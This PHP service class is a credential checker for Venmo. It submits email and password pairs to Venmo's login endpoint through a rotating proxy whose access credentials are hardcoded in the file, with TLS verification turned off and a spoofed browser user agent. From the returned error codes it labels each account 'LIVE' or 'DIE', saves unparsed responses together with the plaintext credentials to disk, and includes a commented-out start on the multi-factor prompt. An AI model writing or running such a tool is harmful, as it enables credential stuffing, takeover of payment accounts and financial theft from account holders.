<?php

namespace App\Service;

use App\Enums\VenmoStatus;
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\RequestOptions;
use Psr\Http\Message\ResponseInterface;

class Venmo
{
    protected Client $client;
    protected CookieJar $cookieJar;

    public function __construct(
        protected string $email,
        protected string $password
    ) {
        $proxySession   =   \Illuminate\Support\Str::random(16);
        $proxyCountry   =   'UnitedStates';
        $proxyAuth      =   'lilmama666:ryBTtIt95DXZkfau_country-' . $proxyCountry . '_session-' . $proxySession;
        $proxyServer    =   '52.0.60.68:31112';

        $this->cookieJar = new CookieJar();
        $this->client = new Client([
            RequestOptions::TIMEOUT => 60,
            RequestOptions::HTTP_ERRORS => false,
            RequestOptions::VERIFY => false,
            RequestOptions::COOKIES   => $this->cookieJar,
            RequestOptions::PROXY => 'http://' . $proxyAuth . '@' . $proxyServer,
            RequestOptions::HEADERS => [
                'User-Agent'    =>  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
            ]
        ]);
    }

    public function handle()
    {
        $loginPage = $this->client->get('https://venmo.com/account/sign-in');

        if ($loginPage->getStatusCode() != 200) {
            return $this->response(VenmoStatus::ERROR, 'Http ' . $loginPage->getStatusCode());
        }

        //
        $loginRequest = $this->client->post('https://venmo.com/login', [
            'form_params'   => [
                'return_json' => true,
                'password' => $this->password,
                'phoneEmailUsername' => $this->email,
            ],
            'headers'   => [
                'Content-Type'  =>  'application/x-www-form-urlencoded',
                'Accept'        =>  'application/json'
            ]
        ]);

        $loginResponse  = $loginRequest->getBody()->getContents();
        $loginResponse = json_decode($loginResponse);

        if (!$loginResponse) {
            return $this->response(VenmoStatus::UNKNOWN, 'Cannot parse the response', $loginRequest);
        }

        $loginResponse = optional($loginResponse);

        if ($loginResponse->error) {
            $status = match ((int) $loginResponse->error->code) {
                264     => VenmoStatus::DIE,
                81109   => VenmoStatus::LIVE,
                default => VenmoStatus::UNKNOWN
            };

            /**
             * @todo
             */
            // if ($status === VenmoStatus::LIVE) {
            //     $otpSecret = $loginRequest->getHeader('venmo-otp-secret');
            //     $otpPageRequest = $this->client->get('https://account.venmo.com/account/mfa/code-prompt?' . http_build_query([
            //         'k' => $otpSecret,
            //         'next'  => '/'
            //     ]));

            //     $otpPageResponse = $otpPageRequest->getBody()->getContents();
            //     preg_match('/id="__NEXT_DATA__" type="application\/json">(.*)<\/script>/', $otpPageResponse, $otpJsonResponseString);
            // }

            return $this->response($status, $loginResponse->error->code . ': ' .  $loginResponse->error->message, $loginRequest);
        }

        return $this->response(VenmoStatus::UNKNOWN, 'Unknown error', $loginResponse);
    }

    public function response(VenmoStatus $status, string $message, ?ResponseInterface $response = null)
    {
        if ($status === VenmoStatus::UNKNOWN && $response) {
            $this->writeUnknownResponse($status, $response);
        }

        return (object) [
            'status'    => $status,
            'message'   => $message,
            'data'      => [
                'email' => $this->email,
                'password' => $this->password,
            ]
        ];
    }

    public function writeUnknownResponse(VenmoStatus $status, ResponseInterface $response)
    {
        try {
            if ($status === VenmoStatus::UNKNOWN) {
                $unknownResponsePath = getcwd() . '/result/unknown/http_' . $response->getStatusCode();

                if (!is_dir($unknownResponsePath)) {
                    @mkdir($unknownResponsePath, 0777, true);
                }

                $htmlResponse = (string) $response->getBody()->getContents();
                $responseJson = json_encode([
                    $this->email,
                    $this->password,
                ]);

                @file_put_contents($unknownResponsePath . '/' . str($this->email)->slug('_') . '.html', <<<KONTOL
                <div>
                    $responseJson
                </div>
                $htmlResponse
            KONTOL);
            }
        } catch (\Throwable $_) {
            // do nothing bro
        }
    }
}
